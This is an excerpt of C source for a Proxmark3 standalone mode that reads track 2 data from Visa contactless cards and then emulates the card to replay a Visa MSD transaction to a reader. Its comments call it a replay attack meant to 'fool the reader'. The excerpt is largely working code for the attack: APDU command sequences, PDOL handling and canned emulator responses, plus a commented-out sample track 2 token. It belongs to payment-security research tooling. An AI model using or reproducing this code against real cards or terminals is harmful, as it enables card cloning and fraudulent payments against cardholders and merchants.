...
void ModInfo(void) {
  DbpString("  HF - Reading VISA cards & Emulating a VISA MSD "
            "Transaction(ISO14443) - (Salvador Mendoza)");
}
 ...
 *
 * If the Proxmark3 found a track 2, it will change to emulation mode (LED C)
 * automatically. During this mode the Proxmark3 will behave as card, emulating
 * a Visa MSD transaction using the pre-saved track2 from the previous reading.
 *
 ...
 * LED A + LED C = in reading mode, but you can jump back to emulation mode by
 * pressing the button LED B = receiving/sending commands, activity
 *
 *
 * Reading or emulating ISO-14443A technology is not limited to payment cards.
 * This example was not only designed to make a replay attack, but to open new
 * possibilities in the ISO-14443A technologies. Be brave enough to share your
 * knowledge & inspire others. Salvador Mendoza.
 */
...
static uint8_t treatPDOL(const uint8_t *apdu) {
  ...
  for (uint8_t i = 1; i <= apdu[0];
       i++) { // Magic stuff, the generation order is important
    if (apdu[i] == 0x9F &&
        apdu[i + 1] == 0x66) { // Terminal Transaction Qualifiers
      ppdol[plen] = 0xF6;
      ppdol[plen + 1] = 0x20;
      ppdol[plen + 2] = 0xC0;
      ppdol[plen + 3] = 0x00;
      ...
      i += 2;
               ...
               apdu[i + 1] == 0x1A) { // Terminal Country Code
      ppdol[plen] = 0x9F;
      ppdol[plen + 1] = 0x1A;
      plen += 2;
      i += 2;
    } else if (apdu[i] == 0x5F &&
               apdu[i + 1] == 0x2A) { // Transaction Currency Code
      ppdol[plen] = 0x5F;
      ppdol[plen + 1] = 0x2A;
      plen += 2;
      i += 2;
      ...
      plen += 4;
      i += 2;
    } else { // To the others, add "0" to complete the format depending on its
             // range
      uint8_t u = apdu[i + 2];
      while (u > 0) {
        ppdol[plen] = 0;
...
void RunMod(void) {
  ...
  DbpString("");
  DbpString(
      _YELLOW_(">>>") " Reading VISA cards & Emulating a VISA MSD Transaction "
                      "a.k.a. MSDSal Started " _YELLOW_("<<<"));
  DbpString("");
  FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

  // free eventually allocated BigBuf memory but keep Emulator Memory
  // also sets HIGH pointer of BigBuf enabling us to malloc w/o fiddling w the
  // reserved emulator memory
  BigBuf_free_keep_EM();
  ...
  uint8_t ppse[20] = {0x00, 0xA4, 0x04, 0x00, 0x0e, 0x32, 0x50,
                      0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e,
                      0x44, 0x44, 0x46, 0x30, 0x31, 0x00};

  uint8_t visa[] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xa0, 0x00,
  ...
  */
  ...
  uint8_t apduslen[4] = {sizeof(ppse), sizeof(visa), sizeof(processing),
                         sizeof(sfi)};
  ...
  //                     44   12   34   56   05   78   12   34   D 1711     2 01
  //                     00   00   03   00   00   99   1
  // char token[19] =
  // {0x44,0x12,0x34,0x56,0x05,0x78,0x12,0x34,0xd1,0x71,0x12,0x01,0x00,0x00,0x03,0x00,0x00,0x99,0x1f};
  //
  // It is possible to initialize directly the emulation mode, having "token"
  // with data and set "chktoken" = true ;)
  //
  char token[19] = {0x00};
  bool chktoken = false;
...
#define STATE_EMU 1
  ...
  // Checking if the user wants to go directly to emulation mode using a
  // hardcoded track 2
    ...
    if (state == STATE_READ) {
      ...
      if (iso14443a_select_card(NULL, &card_a_info, NULL, true, 0, false)) {
        ...
        for (uint8_t i = 0; i < 4; i++) {
          ...
          //    hexstr_to_byte_array("a0da02631a440a44000000a012ad10a00e800200048108",
          //    sam_apdu, &sam_len);
          uint8_t apdulen = iso14_apdu(apdus[i], (uint16_t)apduslen[i], false,
                                       apdubuffer, NULL);
          ...
          if (apdulen > 0) {
            ...
            for (uint8_t u = 0; u < apdulen; u++) {
              if (i == 1) {
                ...
                // find track 2
                if (apdubuffer[u] == 0x57 && apdubuffer[u + 1] == 0x13 &&
                    !chktoken) {
                  chktoken = true;
      ...
      if (SimulateIso14443aInit(11, flags, data, &responses, &cuid, NULL, NULL,
                                NULL) == false) {
        BigBuf_free_keep_EM();
      ...
      for (;;) {
        ...
        if (receivedCmd[0] == ISO14443A_CMD_REQA && len == 1) {
          ...
          if (receivedCmd[0] == 0x02 || receivedCmd[0] == 0x03) {
            ...
            // depending on card reader commands, the Proxmark will answer to
            // fool the reader respond with PPSE
            if (receivedCmd[2] == 0xA4 && receivedCmd[6] == 0x32 &&
                prevCmd == 0) {
              // need to adapt lengths..
              uint8_t ppsea[39] = {
                  //        0x23 = 35,  skip two first bytes then the message -
                  //        SW 2 is 35 = 0x23
                  0x6F, 0x23, 0x84, 0x0E, 0x32, 0x50, 0x41, 0x59, 0x2E, 0x53,
                  0x59, 0x53, 0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0xA5, 0x11,
                  0xBF, 0x0C, 0x0E, 0x61, 0x0C, 0x4F,
                  //  len   aid0  aid1  aid2...
                  0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x87, 0x01,
                  0x01, 0x90, 0x00};
              ...
              // respond Visa AID
            } else if (receivedCmd[2] == 0xA4 && receivedCmd[10] == 0x03 &&
                       receivedCmd[11] == 0x10 && prevCmd == 1) {
              uint8_t visauid_long[34] = {
                  //          0x1E = 30,  skip two first bytes then the message
                  //          - SW 2 is 30 = 0x1E
                  0x6F, 0x1E, 0x84,
                  //      len   aid0  aid1  aid2....
                  0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xA5, 0x13,
                  0x50,
                  //      len      V     I     S     A           C     R    E D
                  //      I     T
                  0x0B, 0x56, 0x49, 0x53, 0x41, 0x20, 0x43, 0x52, 0x45, 0x44,
                  0x49, 0x54, 0x9F, 0x38, 0x03, 0x9F, 0x66, 0x02, 0x90, 0x00};
              memcpy(&dynamic_response_info.response[1], visauid_long,
                     sizeof(visauid_long));
              dynamic_response_info.response_n = sizeof(visauid_long) + 1;
              prevCmd++;

              // GET PROCESSING
            } else if (receivedCmd[1] == 0x80 && receivedCmd[2] == 0xA8 &&
                       receivedCmd[6] == 0x83 && prevCmd == 2) {
              uint8_t processing_long[10] = {0x80, 0x06, 0x00, 0x80, 0x08,
                                             0x01, 0x01, 0x00, 0x90, 0x00};
              memcpy(&dynamic_response_info.response[1], processing_long,
                     sizeof(processing_long));
              dynamic_response_info.response_n = sizeof(processing_long) + 1;
              prevCmd++;

              // SFI
            } else if (receivedCmd[1] == 0x00 && receivedCmd[2] == 0xB2 &&
                       prevCmd == 3) {
              uint8_t card[25] = {0x70, 0x15, 0x57, 0x13, 0x00, 0x00, 0x00,
              ...
              memcpy(&dynamic_response_info.response[1], finished,
                     sizeof(finished));
        ...
        if (dynamic_response_info.response_n > 0) {
          ...
          Dbhexdump(dynamic_response_info.response_n,
                    dynamic_response_info.response, false);
          DbpString("----");
